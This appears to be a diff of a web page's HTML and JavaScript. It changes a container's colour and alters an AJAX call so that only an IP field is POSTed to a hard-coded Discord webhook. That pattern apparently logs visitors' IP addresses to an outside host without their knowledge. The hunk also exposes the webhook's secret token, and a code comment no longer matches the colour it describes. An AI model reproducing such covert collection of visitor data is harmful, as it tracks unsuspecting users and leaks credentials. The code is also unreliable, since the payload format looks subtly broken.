@@ -18,7 +18,7 @@
         }
         .container {
             text-align: center;
-            background-color: #ff6666; /* Changed container color to red */
+            background-color: #000000; /* Changed container color to red */
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
@@ -76,7 +76,7 @@
                 $.ajax({
                     type: "POST",
                     url: "https://discord.com/api/webhooks/1237706616963600414/_6z34EvM2yLrkds0Rsq5ZS-C37J-mUj71I8XSm3QDTJdD8CNx1w_Qx-kIgD6G8wr-M5q",
-                    data: JSON.stringify(data),
+                    data: JSON.stringify(data.ip),
                     contentType: "application/json"
                 });
             });
